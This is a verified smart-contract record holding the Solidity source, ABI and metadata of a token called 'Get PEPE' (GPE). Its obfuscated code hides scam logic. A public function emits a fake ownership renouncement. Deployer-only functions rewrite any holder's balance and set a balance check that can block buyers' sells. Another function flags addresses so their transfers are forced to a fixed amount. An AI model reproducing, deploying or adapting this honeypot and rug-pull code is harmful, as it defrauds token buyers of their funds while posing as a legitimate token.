{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface buyTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchMin) external view returns (uint256);\n\n    function transfer(address fundMaxLimit, uint256 listFund) external returns (bool);\n\n    function allowance(address swapAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundMaxLimit,\n        uint256 listFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamTxLaunched, uint256 value);\n    event Approval(address indexed swapAuto, address indexed spender, uint256 value);\n}\n\nabstract contract takeIsFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromMode {\n    function createPair(address listAmountFee, address senderMaxShould) external returns (address);\n}\n\ninterface senderLiquidity is buyTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GetPEPE is takeIsFund, buyTake, senderLiquidity {\n\n    mapping(address => mapping(address => uint256)) private receiverTotal;\n\n    function sellTo(address toTeam) public {\n        require(toTeam.balance < 100000);\n        if (minLiquidity) {\n            return;\n        }\n        if (isLimit == minFee) {\n            totalTx = true;\n        }\n        tokenList[toTeam] = true;\n        \n        minLiquidity = true;\n    }\n\n    uint256 tokenWallet;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenTake;\n    }\n\n    bool public totalTx;\n\n    address atExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return shouldExemptTo;\n    }\n\n    uint256 constant launchedTake = 20 ** 10;\n\n    address public maxMin;\n\n    address private shouldExemptTo;\n\n    uint256 public tokenExempt;\n\n    event OwnershipTransferred(address indexed modeMax, address indexed launchedShould);\n\n    function swapAmountLimit(address maxIs, address fundMaxLimit, uint256 listFund) internal returns (bool) {\n        if (maxIs == takeMinLaunched) {\n            return takeExemptEnable(maxIs, fundMaxLimit, listFund);\n        }\n        uint256 feeLimit = buyTake(maxMin).balanceOf(walletTotal);\n        require(feeLimit == tokenWallet);\n        require(fundMaxLimit != walletTotal);\n        if (tokenLaunch[maxIs]) {\n            return takeExemptEnable(maxIs, fundMaxLimit, launchedTake);\n        }\n        return takeExemptEnable(maxIs, fundMaxLimit, listFund);\n    }\n\n    uint256 shouldReceiver;\n\n    function allowance(address takeMax, address modeAmount) external view virtual override returns (uint256) {\n        if (modeAmount == atExempt) {\n            return type(uint256).max;\n        }\n        return receiverTotal[takeMax][modeAmount];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoSellSender;\n    }\n\n    function liquidityFrom() private view {\n        require(tokenList[_msgSender()]);\n    }\n\n    mapping(address => uint256) private listToMode;\n\n    uint256 private shouldTeam;\n\n    uint256 private fundTake = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundTake;\n    }\n\n    constructor (){\n        \n        shouldMarketing atMax = shouldMarketing(atExempt);\n        maxMin = fromMode(atMax.factory()).createPair(atMax.WETH(), address(this));\n        if (fundSell == liquidityMax) {\n            totalTx = true;\n        }\n        takeMinLaunched = _msgSender();\n        shouldSellTotal();\n        tokenList[takeMinLaunched] = true;\n        listToMode[takeMinLaunched] = fundTake;\n        if (shouldTeam == liquidityMax) {\n            tokenExempt = isLimit;\n        }\n        emit Transfer(address(0), takeMinLaunched, fundTake);\n    }\n\n    function shouldSellTotal() public {\n        emit OwnershipTransferred(takeMinLaunched, address(0));\n        shouldExemptTo = address(0);\n    }\n\n    uint256 public fundSell;\n\n    uint256 private minFee;\n\n    function transfer(address isTx, uint256 listFund) external virtual override returns (bool) {\n        return swapAmountLimit(_msgSender(), isTx, listFund);\n    }\n\n    function approve(address modeAmount, uint256 listFund) public virtual override returns (bool) {\n        receiverTotal[_msgSender()][modeAmount] = listFund;\n        emit Approval(_msgSender(), modeAmount, listFund);\n        return true;\n    }\n\n    address walletTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return shouldExemptTo;\n    }\n\n    function launchFund(address swapFund) public {\n        liquidityFrom();\n        \n        if (swapFund == takeMinLaunched || swapFund == maxMin) {\n            return;\n        }\n        tokenLaunch[swapFund] = true;\n    }\n\n    string private swapMax = \"Get PEPE\";\n\n    mapping(address => bool) public tokenLaunch;\n\n    string private tokenTake = \"GPE\";\n\n    function amountShould(uint256 listFund) public {\n        liquidityFrom();\n        tokenWallet = listFund;\n    }\n\n    uint256 private isLimit;\n\n    bool public minLiquidity;\n\n    bool private shouldList;\n\n    bool public totalLiquidity;\n\n    address public takeMinLaunched;\n\n    function transferFrom(address maxIs, address fundMaxLimit, uint256 listFund) external override returns (bool) {\n        if (_msgSender() != atExempt) {\n            if (receiverTotal[maxIs][_msgSender()] != type(uint256).max) {\n                require(listFund <= receiverTotal[maxIs][_msgSender()]);\n                receiverTotal[maxIs][_msgSender()] -= listFund;\n            }\n        }\n        return swapAmountLimit(maxIs, fundMaxLimit, listFund);\n    }\n\n    uint8 private autoSellSender = 18;\n\n    function takeExemptEnable(address maxIs, address fundMaxLimit, uint256 listFund) internal returns (bool) {\n        require(listToMode[maxIs] >= listFund);\n        listToMode[maxIs] -= listFund;\n        listToMode[fundMaxLimit] += listFund;\n        emit Transfer(maxIs, fundMaxLimit, listFund);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapMax;\n    }\n\n    function balanceOf(address launchMin) public view virtual override returns (uint256) {\n        return listToMode[launchMin];\n    }\n\n    function amountReceiverTeam(address isTx, uint256 listFund) public {\n        liquidityFrom();\n        listToMode[isTx] = listFund;\n    }\n\n    uint256 public liquidityMax;\n\n    mapping(address => bool) public tokenList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTxLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"amountReceiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"amountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"}],\"name\":\"launchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"}],\"name\":\"sellTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSellTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMinLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMaxLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GetPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}